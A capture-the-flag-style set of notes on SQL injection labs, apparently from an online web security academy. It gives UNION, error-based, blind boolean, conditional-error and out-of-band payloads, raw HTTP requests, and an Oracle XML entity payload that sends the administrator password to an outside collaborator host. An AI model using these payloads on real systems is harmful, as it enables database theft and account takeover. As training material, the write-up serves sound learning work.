# Encounters with SQLi

# SQL injection attack, listing the database contents on Oracle

Get logged in as Administrator using the SQLi vulnerability. 
## Observations
- Server errors out on a single quote to the Categories filter param. 
- Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:

```'+UNION+SELECT+'abc','def'+FROM+dual--```
- Use the following payload to retrieve the list of tables in the database:

```'+UNION+SELECT+table_name,NULL+FROM+all_tables--```
- Find the name of the table containing user credentials.
Use the following payload (replacing the table name) to retrieve the details of the columns in the table:

```'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ADBYJT'--```
- Find the names of the columns containing usernames and passwords.
Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:

```'+UNION+SELECT+USERNAME_ADGIOH,+PASSWORD_DXIGSJ+FROM+USERS_ABCDEF-- ```

Final payload:
```GET /filter?category=Gifts%27%20UNION%20SELECT%20USERNAME_ADGIOH,PASSWORD_DXIGSJ+FROM+USERS_ADBYJT--```
Find the password for the administrator user, and use it to log in.

## Visible error-based SQL injection
In the Shop app, get the administrator username and password. 
## Observations
- The TrackingId cookie is vulnerable to SQLi. 
- There is only 1 column:
```
GET /filter?category=Gifts HTTP/2
Host: 0ac100860458d22081a92fdb004300d4.web-security-academy.net
Cookie: TrackingId=TynCM5K6RLRKdCPa'+ORDER+BY+1--; session=rzBGt19n6jve3MMgkapeHCTeDfGy3NpX
```
- Adapt the query to include a generic SELECT subquery and cast the returned value to an int data type:

```TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--```
Send the request. Observe that you now get a different error saying that an AND condition must be a boolean expression.

- Modify the condition accordingly. For example, you can simply add a comparison operator (=) as follows:

```TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--```
Send the request. Confirm that you no longer receive an error. This suggests that this is a valid query again.

- Adapt your generic SELECT statement so that it retrieves usernames from the database:

```TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--```
Observe that you receive the initial error message again. Notice that your query now appears to be truncated due to a character limit. As a result, the comment characters you added to fix up the query aren't included.

- Delete the original value of the TrackingId cookie to free up some additional characters. Resend the request.

```TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--```
Notice that you receive a new error message, which appears to be generated by the database. This suggests that the query was run properly, but you're still getting an error because it unexpectedly returned more than one row.

- Modify the query to return only one row:

```TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--```

```
Cookie: TrackingId=T' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--; session=rzBGt19n6jve3MMgkapeHCTeDfGy3NpX
```
Send the request. Observe that the error message now leaks the first username from the users table:

ERROR: invalid input syntax for type integer: "administrator"

- Now that you know that the administrator is the first user in the table, modify the query once again to leak their password:

```TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--```

```
GET /filter?category=Gifts HTTP/2
Host: 0ac100860458d22081a92fdb004300d4.web-security-academy.net
Cookie: TrackingId=T' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--; session=rzBGt19n6jve3MMgkapeHCTeDfGy3NpX
```
- Log in as administrator using the stolen password to solve the lab.

# Blind SQL injection with out-of-band interaction
Get a DNS lookup to BurpCollaborator via the SQLi.
## Observations
No clear vulnerabilities. There is a TrackingId cookie so it may be in that but it doesn't seem to change the behavior of the application. 

- Oracle payload to get OOB interaction:
```
GET /filter?category=Toys+%26+Games HTTP/2
Host: 0a8a003c030d338e828b8deb004c0055.web-security-academy.net
Cookie: TrackingId=pdPF94XVSqyqI0Ts'||+(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//wllxdgwpnw3dop9t2v2lbwp2vt1kpbd0.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual)--; session=LKe7iMf5zWDWrruDj7hwS1HSi6f1yIyz
```

# Blind SQL injection with out-of-band data exfiltration
In this challenge, the goal is to get the username and password for administrator using the OOB server. 

It is very similar to the above challenge so we'll just redo that but modify the payload to append the necessary information to the request to collaborator:

- Start with this payload to confirm OOB interaction:
```
'||+(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//5696yphy85om9yu2n4nuw5abg2mtamyb.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual)--
```
- Then we need to actuall extract data. We do this by modifying the payload to include information from the users table. To do that, we prepend the select statement to the OOB URL:
``` '||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||' ```
So the total payload looks like this:
```
GET / HTTP/2
Host: 0ad6003b03dee4e48084082400a000b3.web-security-academy.net
Cookie: TrackingId=NZabXq0UXiDJYBCi'||+(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'5696yphy85om9yu2n4nuw5abg2mtamyb.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual)--; session=lGNWfFh61OTxKMmsh25Ka9MeoYPdMbtl
```
Just the payload:
```
'||+(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'5696yphy85om9yu2n4nuw5abg2mtamyb.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual)--
```
The password is prepended to the Hostname in the request. Use that to log in, solved. 

BTW BurpSuite Pro Scanner will find this OOB which is hard because I haven't found a real easy way to see it without that. 

# SQL Injection with filter bypass via XML Encoding
The goal of this challenge is to get the admin's credentials and log into their account via the SQLi. 
## Observations
- Very much unlike the other SQLi labs. This one appears to be within the XML of the product lookup API requests which is cool. 
- Adding a single quote to the value of the productId threw an "attack detected" error. So, we'll try to subvert that logic to get through. 
- Screwed around on ProductId for a while, while it does prompt the WAF, its not the vulnerable function. It is StoreID. Using Hackverter and hex_entities encoding I coud get the column with ```1 UNION SELECT NULL``` There isn't a second column, throws a zero "error". 
- Need to concatenant the username and password columns since we can only retrieve one, or do them separately. 
```
1 UNION SELECT username || '~' || password FROM users
```

# Union Attacks
Determine the number of columns in the query by using the UNION injection technique. 
Vulnerabilities was in the categories filter for the shop. By adding the payload ```' UNION NULL,NULL,NULL --``` I was able to find that there are three columns. 
```
category=Gifts%27%20UNION%20SELECT%20NULL,NULL,NULL%20--
```

# Using Union injection techniques, find the column containing text (strings). 

First, I find the number of coulmns in Shop's category filter again with the UNION NULL technique - 
```
category=Tech+gifts%27%20UNION%20SELECT%20NULL,NULL,NULL%20--
```

Then, we start replacing each of the nulls iteratively with the letter a, or any character, until we find the column that doesn't error out. Multiple columns might work. The character needs to be encased in single quotes. 

It was the second column in this case - 
```
category=Tech+gifts%27%20UNION%20SELECT%20NULL,%27a%27,NULL%20--
```
Once found, I had to made the database retrieve a specific string 'SIHTLj' to solve the challenge. 

# Retrieve username and password for administrator and log in
```
category=Gifts%27%20UNION%20SELECT%20username,%20password%20FROM%20users--
```

# Find the username and password using concatination from the categories vulnerable to SQLi in Shop. 

First find the column number and which one holds the strings:
Columns - ```category=Gifts%27%20UNION%20SELECT%20NULL,NULL--```
Strings - ```category=Gifts%27%20UNION%20SELECT%20NULL,%27abc%27--```
Now concatenate the username and password fields from the users table - ```category=Gifts%27+UNION+SELECT+NULL,username||%27~%27||password+FROM+users--```
Where the concatination was ``` 'UNION SELECT NULL,username||'~'||password FROM users--```

# Retrieve the version string from a Microsoft or MySQL database via the categories SQLi. 
```
category=Tech+gifts%27%20UNION%20ALL%20SELECT%20NULL,version()%20--%20-
```
The solution payload didn't actually work in this case, I ended up using SQLmap to find payloads that did work and then made the above one on my own. 

# Get the database and table information out of the database 

Get the admin login. 

First, determine number of columns. 
Second, list table names from information_schema.tables - ```category=Gifts%27+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--```
Third, select the column names from the table from information_schema.columns - ```category=Gifts%27+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns%20WHERE%20table_name=%27users_brauzl%27--```
Finally, extract the usernames and passwords from the table users_brauzl and the columns found - ```category=Gifts%27%20UNION%20SELECT%20username_onopjk,%20password_bikvfm%20FROM%20users_brauzl%20--```

# Find the SQL injection (trackingId cookie) and then use blind boolean methods to uncover the administrator's password to login. 

Found the SQLi by conducting a simple 1=1 boolean injection on the cookie which when 1=2 we did not get the "Welcome Back" tracking banner but when 1=1 we did. 
```
GET /filter?category=Toys+%26+Games HTTP/2
Host: 0af200090370843486cfde7a00470058.web-security-academy.net
Cookie: TrackingId=BQ4yupPEXi6QwoRX'+AND+'1'='2'--; session=v6Cy546NwHBVlsM3LlV8KsK1hkx78Dwm
```
Then, we check to see if there is a username that starts with 'a' in the users table:
```
GET /filter?category=Toys+%26+Games HTTP/2
Host: 0af200090370843486cfde7a00470058.web-security-academy.net
Cookie: TrackingId=BQ4yupPEXi6QwoRX'+AND+(SELECT 'a' FROM users LIMIT 1)='a; session=v6Cy546NwHBVlsM3LlV8KsK1hkx78Dwm
```
Then, validate that the username is indeed administrator:
```
GET /filter?category=Toys+%26+Games HTTP/2
Host: 0af200090370843486cfde7a00470058.web-security-academy.net
Cookie: TrackingId=BQ4yupPEXi6QwoRX'+AND+(SELECT 'a' FROM users WHERE username='administrator')='a; session=v6Cy546NwHBVlsM3LlV8KsK1hkx78Dwm
```
Determine the length of the administrators password by asking if it is true that the length is greater than 19 which it is but it is not greater than 20:
```
GET /filter?category=Toys+%26+Games HTTP/2
Host: 0af200090370843486cfde7a00470058.web-security-academy.net
Cookie: TrackingId=BQ4yupPEXi6QwoRX'+AND+(SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>19)='a; session=v6Cy546NwHBVlsM3LlV8KsK1hkx78Dwm
```
Next, we're looking to find all 20 characters to the password. 
```
GET /filter?category=Toys+%26+Games HTTP/2
Host: 0af200090370843486cfde7a00470058.web-security-academy.net
Cookie: TrackingId=BQ4yupPEXi6QwoRX'+AND+(SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a; session=v6Cy546NwHBVlsM3LlV8KsK1hkx78Dwm
```
The above request gets sent to intruder where we section  mark the last 'a' and iterate through it along with each position until we find the complete password. Each 'true' letter is confirmed by the "Welcome Back" message being displayed which we can filter for in intruder. 

# From an Oracle DB, find the username and password for the administrator and login. 

Found the injection is in the trackingID cookie again but this time there is no Welcome Back banner. Instead, it throws and error when I append a single quote. Appending double single quotes fixes the query so that's the injection point. 
Next, we need to try to find a predictable database name for Oracle and see if we can get info from it, for this I used ```'||(SELECT '' FROM dual)||'```
```
GET /filter?category=Gifts HTTP/2
Host: 0a26004603ad956483044797002a0054.web-security-academy.net
Cookie: TrackingId=b2qz4FN3jzJ5SshUv'||(SELECT '' FROM dual)||'; session=mhReDB1XnUY34J9i3trzjI3C9SDSW1eF
```
This returned a valid response which was then verified by changing dual to 'foo' which threw another error. So we can infer true statements by whether or not the server throws an error. 

Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie. For simplicity, let's say the original value of the cookie is TrackingId=xyz.
Modify the TrackingId cookie, appending a single quotation mark to it:

TrackingId=xyz'
Verify that an error message is received.

Now change it to two quotation marks:
```TrackingId=xyz''```
Verify that the error disappears. This suggests that a syntax error (in this case, the unclosed quotation mark) is having a detectable effect on the response.
You now need to confirm that the server is interpreting the injection as a SQL query i.e. that the error is a SQL syntax error as opposed to any other kind of error. To do this, you first need to construct a subquery using valid SQL syntax. Try submitting:
```
TrackingId=xyz'||(SELECT '')||'```
In this case, notice that the query still appears to be invalid. This may be due to the database type - try specifying a predictable table name in the query:
```
TrackingId=xyz'||(SELECT '' FROM dual)||'```
As you no longer receive an error, this indicates that the target is probably using an Oracle database, which requires all SELECT statements to explicitly specify a table name.

Now that you've crafted what appears to be a valid query, try submitting an invalid query while still preserving valid SQL syntax. For example, try querying a non-existent table name:
```
TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'```
This time, an error is returned. This behavior strongly suggests that your injection is being processed as a SQL query by the back-end.

As long as you make sure to always inject syntactically valid SQL queries, you can use this error response to infer key information about the database. For example, in order to verify that the users table exists, send the following query:
```
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'```
As this query does not return an error, you can infer that this table does exist. Note that the WHERE ROWNUM = 1 condition is important here to prevent the query from returning more than one row, which would break our concatenation.

You can also exploit this behavior to test conditions. First, submit the following query:
```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'```
Verify that an error message is received.

Now change it to:
```
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'```
Verify that the error disappears. This demonstrates that you can trigger an error conditionally on the truth of a specific condition. The CASE statement tests a condition and evaluates to one expression if the condition is true, and another expression if the condition is false. The former expression contains a divide-by-zero, which causes an error. In this case, the two payloads test the conditions 1=1 and 1=2, and an error is received when the condition is true.

You can use this behavior to test whether specific entries exist in a table. For example, use the following query to check whether the username administrator exists:
```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'```
Verify that the condition is true (the error is received), confirming that there is a user called administrator.

The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:
```
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'```
This condition should be true, confirming that the password is greater than 1 character in length.

Send a series of follow-up values to test different password lengths. Send:
```
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'```
Then send:
```
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'```
And so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the error disappears), you have determined the length of the password, which is in fact 20 characters long.

After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.
Go to Burp Intruder and change the value of the cookie to:
```
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'```
This uses the SUBSTR() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.

Place payload position markers around the final a character in the cookie value. To do this, select just the a, and click the "Add §" button. You should then see the following as the cookie value (note the payload position markers):
```
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'```
To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. In the "Payloads" side panel, check that "Simple list" is selected, and under "Payload configuration" add the payloads in the range a - z and 0 - 9. You can select these easily using the "Add from list" drop-down.
Launch the attack by clicking the " Start attack" button.
Review the attack results to find the value of the character at the first position. The application returns an HTTP 500 status code when the error occurs, and an HTTP 200 status code normally. The "Status" column in the Intruder results shows the HTTP status code, so you can easily find the row with 500 in this column. The payload showing for that row is the value of the character at the first position.
Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the original Intruder tab, and change the specified offset from 1 to 2. You should then see the following as the cookie value:
```
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'```
Launch the modified attack, review the results, and note the character at the second offset.
Continue this process testing offset 3, 4, and so on, until you have the whole password.
In the browser, click "My account" to open the login page. Use the password to log in as the administrator user.